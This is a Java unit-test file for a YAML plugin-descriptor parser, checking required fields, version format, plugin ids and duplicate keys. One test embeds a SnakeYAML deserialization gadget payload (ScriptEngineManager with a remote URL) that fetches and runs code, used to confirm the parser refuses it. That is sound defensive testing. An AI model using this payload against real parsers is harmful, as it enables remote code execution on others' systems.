/*
 * Copyright 2020-2026 The Billing Project, LLC
 *
 * The Billing Project licenses this file to you under the Apache License, version 2.0
 * (the "License"); you may not use this file except in compliance with the
 * License.  You may obtain a copy of the License at:
 *
 *    http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  See the
 * License for the specific language governing permissions and limitations
 * under the License.
 */

package org.killbill.billing.lpr.descriptor.yaml;

import java.io.ByteArrayInputStream;
import java.nio.charset.StandardCharsets;

import org.killbill.billing.lpr.spi.PluginDescriptor;
import org.testng.annotations.Test;

import static org.testng.Assert.assertEquals;
import static org.testng.Assert.assertThrows;
import static org.testng.Assert.expectThrows;
import static org.testng.Assert.assertTrue;

public class TestYamlDescriptorParser {

    private final YamlDescriptorParser parser = new YamlDescriptorParser();

    @Test(groups = "fast")
    public void testParsesACompleteDescriptor() {
        final PluginDescriptor descriptor = parse("""
                id: stripe-payment
                name: Stripe Payment Plugin
                version: 1.2.0
                entrypoint:
                  class: com.example.stripe.StripePlugin
                config:
                  stripe.timeout: 30000
                  stripe.mode: live
                """);

        assertEquals(descriptor.pluginId(), "stripe-payment");
        assertEquals(descriptor.name(), "Stripe Payment Plugin");
        assertEquals(descriptor.version(), "1.2.0");
        assertEquals(descriptor.entrypointClass(), "com.example.stripe.StripePlugin");
        // Numbers are coerced to String: typing is the plugin's business, via PluginConfig.find(key, type).
        assertEquals(descriptor.config().get("stripe.timeout"), "30000");
        assertEquals(descriptor.config().get("stripe.mode"), "live");
    }

    @Test(groups = "fast")
    public void testNameDefaultsToThePluginId() {
        assertEquals(parse("""
                id: minimal
                version: 1.0.0
                entrypoint:
                  class: com.example.Minimal
                """).name(), "minimal");
    }

    /** The shorthand people type from memory has to work as well as the nested form. */
    @Test(groups = "fast")
    public void testEntrypointAcceptsTheFlatShorthand() {
        assertEquals(parse("""
                id: flat
                version: 1.0.0
                entrypoint: com.example.FlatPlugin
                """).entrypointClass(), "com.example.FlatPlugin");
    }

    /**
     * An unorderable version would make "which version should run" unanswerable, so it is rejected
     * at parse time rather than at startup.
     */
    @Test(groups = "fast")
    public void testAnUnorderableVersionIsRejected() {
        final IllegalArgumentException failure = expectThrows(IllegalArgumentException.class, () -> parse("""
                id: bad-version
                version: latest
                entrypoint: com.example.Plugin
                """));
        assertTrue(failure.getMessage().contains("semantic version"), failure.getMessage());
    }

    @Test(groups = "fast")
    public void testMissingRequiredFieldsAreReportedByName() {
        assertTrue(expectThrows(IllegalArgumentException.class,
                                () -> parse("version: 1.0.0\nentrypoint: com.example.P\n"))
                           .getMessage().contains("'id'"));

        assertTrue(expectThrows(IllegalArgumentException.class,
                                () -> parse("id: p\nversion: 1.0.0\n"))
                           .getMessage().contains("entrypoint.class"));
    }

    /** Plugin ids end up in URLs, directory names and metrics dimensions. */
    @Test(groups = "fast")
    public void testAnInvalidPluginIdIsRejected() {
        assertThrows(IllegalArgumentException.class, () -> parse("""
                id: StripePayment
                version: 1.0.0
                entrypoint: com.example.P
                """));
    }

    /**
     * A descriptor may arrive from a plugin author. YAML's default constructor can instantiate
     * classes named in the document, which a descriptor never needs to do.
     */
    @Test(groups = "fast")
    public void testArbitraryClassInstantiationIsRefused() {
        assertThrows(Exception.class, () -> parse("""
                id: exploit
                version: 1.0.0
                entrypoint: !!javax.script.ScriptEngineManager [!!java.net.URL ["http://example.invalid/"]]
                """));
    }

    @Test(groups = "fast")
    public void testDuplicateKeysAreRefusedRatherThanSilentlyOverridden() {
        assertThrows(Exception.class, () -> parse("""
                id: dup
                version: 1.0.0
                version: 2.0.0
                entrypoint: com.example.P
                """));
    }

    @Test(groups = "fast")
    public void testAnEmptyDescriptorSaysWhatIsMissing() {
        assertTrue(expectThrows(IllegalArgumentException.class, () -> parse(""))
                           .getMessage().contains("empty"));
    }

    private PluginDescriptor parse(final String yaml) {
        return parser.parse(new ByteArrayInputStream(yaml.getBytes(StandardCharsets.UTF_8)), "test-descriptor");
    }
}
